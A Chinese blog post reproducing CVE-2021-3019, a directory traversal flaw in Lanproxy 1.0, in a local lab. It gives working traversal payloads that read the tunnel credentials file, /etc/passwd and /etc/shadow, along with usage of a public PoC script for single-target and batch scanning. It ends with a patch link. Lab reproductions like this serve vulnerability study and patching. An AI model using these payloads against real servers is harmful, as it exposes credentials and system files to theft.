# CVE-2021-3019—Lanproxy 任意文件读取漏洞复现 - 20181326jie - 博客园

> 原文：[`www.cnblogs.com/oylj26/p/14727841.html`](https://www.cnblogs.com/oylj26/p/14727841.html)

## 1.简介

lanproxy 是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，支持 tcp 流量转发，可支持任何 tcp 上层协议（访问内网网站、本地支付接口调试、ssh 访问、远程桌面...）。目前市面上提供类似服务的有花生壳、TeamView、GoToMyCloud 等等，但要使用第三方的公网服务器就必须为第三方付费，并且这些服务都有各种各样的限制，此外，由于数据包会流经第三方，因此对数据安全也是一大隐患。

## 2.漏洞概述

Lanproxy1.0 通过../绕过读取任意文件。该漏洞允许目录遍历读取/../conf/config.properties 来获取到内部网连接的凭据。

## 3.影响版本

Lanproxy1.0

## 4.环境搭建

1）.下载 Lanproxy 安装包，下载地址：

[`file.nioee.com/d/2e81550ebdbd416c933f/`](https://file.nioee.com/d/2e81550ebdbd416c933f/)

![](img/4afd173e4454ff64462fa3d6a29565a1.png)

2）.解压后移动到/usr/local 目录下

```
mv proxy-server-0.1/ /usr/local/
```

![](img/e22dd77afeb295328fdea37f3cd45071.png)

3）.进入 proxy-server-0.1 bin 目录下给 startup.sh 加上执行权限，然后启动服务

```
cd proxy-server-0.1/bin

chmod +x startup.sh

./startup.sh
```

![](img/f68b851486092ab2a4c28beb99823f8b.png)

4）.在浏览器访问[`192.168.238.131:8090`](http://192.168.238.131:8090)，出现以下登录界面启动成功

![](img/62174e38144327c62019ca0b8ba7d8be.png)

## 5.漏洞复现

0.关于 burp 的配置：

（1）首先要对浏览器进行网络配置，这里使用的是 kali 中的 firefox：

![](img/b177db8caf354d86cd9f9897a1060cfd.png)

（2）对 burp 进行监听配置（与 1 中的网络 ip 和端口一致）：

![](img/51629bb2d3b34a85662420d4d142f6f0.png)

1）.在登录页面，使用 Burp 抓包，并发送到 Repeater（重放模块）

![](img/1232aebced20afc18c2818f5e20f2b2d.png)

2）.在 url 构造以下链接读取配置文件

```
/../conf/config.properties
```

![](img/45a1b0e93c1e4cb6362d948951fd467c.png)

3）.修改 payload 读取敏感文件

```
/../../../../etc/passwd
```

![](img/ca21128bb5d792a59a52e3ec0622af96.png)

## 6.POC 脚本：

1）.这里是在网上找的脚本，使用的 python 语言，参考链接[`github.com/FanqXu/CVE-2021-3019`](https://github.com/FanqXu/CVE-2021-3019)： 

2）.下载 POC.py 到主机 kali 中，默认不带参数运行显示帮助信息：

![](img/099613f8f44f89dd2b81a182e3765229.png)

3）.**单个 URL**

对单个 URL 进行漏洞检测，如果存在漏洞则默认读取配置文件并输出（这里的网址就是登陆 proxy 的网址）

```
python3 POC.py -u http://127.0.0.1:8090

```

![](img/70e9157eb856f9e2ab9ddbc613860851.png)

4）.**读取其他文件**

使用`-r`参数读取系统其他文件，需要知道文件的绝对路径

```
python3 POC.py -u http://127.0.0.1:8090 -r /etc/shadow

```

 ![](img/31e131990e8f3fa480ea5195f8d8db3b.png)

5）.**批量扫描**

使用`-f`参数批量检测，有漏洞的将被写入`success.txt`文件

```
python3 POC.py -f ../../urls.txt
```

## 7.修复建议

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

[`github.com/ffay/lanproxy/commits/master`](https://github.com/ffay/lanproxy/commits/master)